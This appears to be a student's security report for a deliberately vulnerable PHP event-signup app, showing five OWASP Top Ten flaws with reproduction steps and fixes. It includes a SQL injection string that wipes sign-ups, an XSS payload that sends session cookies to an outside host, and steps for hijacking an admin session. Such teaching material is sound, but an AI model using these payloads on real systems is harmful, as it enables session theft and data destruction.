# The Report

This project is done with PHP in a LAMP environment.<br> 
The requirements:

1. Windows, OS X or Linux as the host
2. OWASP ZAP
3. Firefox with the Advanced Cookie Manager add-on
4. VirtualBox
5. Debian as a virtual machine

See https://github.com/j0ly/firstproject/blob/master/README.md for installation instructions.

There are more problems with this code besides those which I have mentioned and provided a fix for here below. And regarding the suggested fixes, I know that there are many things that could be done to further improve the security. But I had to draw the line somewhere. The task was to have at least 5 OWASP Top Ten vulnerabilies, and to provide a fix for them, which I think I have done.


The OWASP vulnerabilities:

## A1-Injection

The content of the database can be deleted using SQL injection.

### How to identify 
1. Sign up some users to the event. Check from the Admin page. 
2. Then go to the Cancel page and enter: ```' OR '1'='1```. 
3. All the sign-ups are now gone, as you can see from the Admin page!    

### How to fix
Add this after line 14 in delete.php;

```$ticket = mysqli_real_escape_string($conn, $ticket);```

## A2-Broken Authentication and Session Management
The cookie-session-id, which is used for authentication, is sent over an unencrypted connection.<br>

### How to identify
You can get access to the Admin pages using an eavesdropped cookie-session-id like this:

1. Start OWASP ZAP and configure the proxy settings in the browser (see [README.md](README.md#owasp-zap)).
2. Go to the Event-X Admin pages, look who have signed up, and then click the "home" link.
3. You're now back at the starting page, which doesn't use SSL.
4. But with OWASP ZAP you can see that the session-cookie is still in use (see [README.md](README.md#owasp-zap)). If someone would have the possibility to eavesdrop, they could now steal the cookie-session-id!
5. Copy the cookie-session-id to simulate this situation!
  * And if you were using the Firefox browser for this, restart it before the next step...
6. Go to the Admin login-page with Firefox, but don’t log in! 
7. Open “Advanced Cookie Manager” and paste the cookie-session-id into the "Value" box (see [README.md](README.md#advanced-cookie-manager-for-firefox)). 
  * Note: You have to  delete the old one first, otherwise you will not be able to save the change.
  * Close the Advanced Cookie Manger when finished.
8. Go back to the Event-X start page and click the "Admin" link, - now you’re in without entering credentials!

### How to fix
Force HTTPS for the whole server;

1. In /etc/apache2/sites-available/000-default.conf, add this line after the "DocumentRoot" line (modify "yourserver" to match the IP of your server); 
  * ``` Redirect permanent / https://yourserver/ ``` 
2. Restart Apache with this command; ``` apachectl restart ```

## A3-Cross-Site Scripting (XSS)
The XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
### How to identify
1. Restart the browser (to clear away the session-cookie). 
2. Enter this code into the address field on the SignUp page;
   * ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
3. Go to the Admin pages and take a look at the sign-ups.
4. The session-id should now be written to the Apache logs of “yourserver”, which you can see with the "cat /var/log/apache2/access.log" command (this would normally be an other server, that the hacker has access to). 

or 

1. Enter this code to any of the fields on the SignUp page; 
   * ```<body onload=alert('hello')>```
2. You will then receive a "hello" greeting, when looking at the sign-ups.

### How to fix
In done.php you can find these lines;
```
$fname = $_POST["name"];
$faddress = $_POST["address"];
$creditcard = $_POST["creditcard"];
```
Replace them with these lines;
```
$fname = clean($_POST["name"]);
$faddress = clean($_POST["address"]);
$creditcard = clean($_POST["creditcard"]);

function clean($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}
```

## A6-Sensitive Data Exposure
Credit card numbers are sent in cleartext with POST, over an unencrypted connection.

### How to identify

1. Start OWASP ZAP and configure the proxy settings in the browser (see README.md).
2. Go to the Event-X SignUp page and fill in the requested information, including a (imaginary) credit card number.
3. Press Submit
4. With OWASP ZAP you can now see that the credit card number was sent over an unencrypted http connection (see [README.md](README.md#owasp-zap)).

### How to fix: 
Force HTTPS for the whole server (see the A2-fix)! 

## A7-Missing Function Level Access Control
The database credentials are stored in an easy to guess plaintext config file, inside the web-root, and is lacking access control.
### How to identify
Modify “yourserver” in this link to match your installation; http://yourserver/firstproject/admin/config.ini.<br> 
Then open this link with your browser, and you should see the credentials.

### How to fix
Deny access to the config.ini file. 

There is already a .htaccess file in the admin folder that should do that, but Apache does not by default enable the use of .htaccess files. To enable, do this:

  Open /etc/apache2/apache2.conf in an editor, and find these lines;
  ```
  <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
  </Directory>
  ```
  Change “AllowOverride None” to “AllowOverride All”. Run the command “apachectl restart”, and try to open the link again.
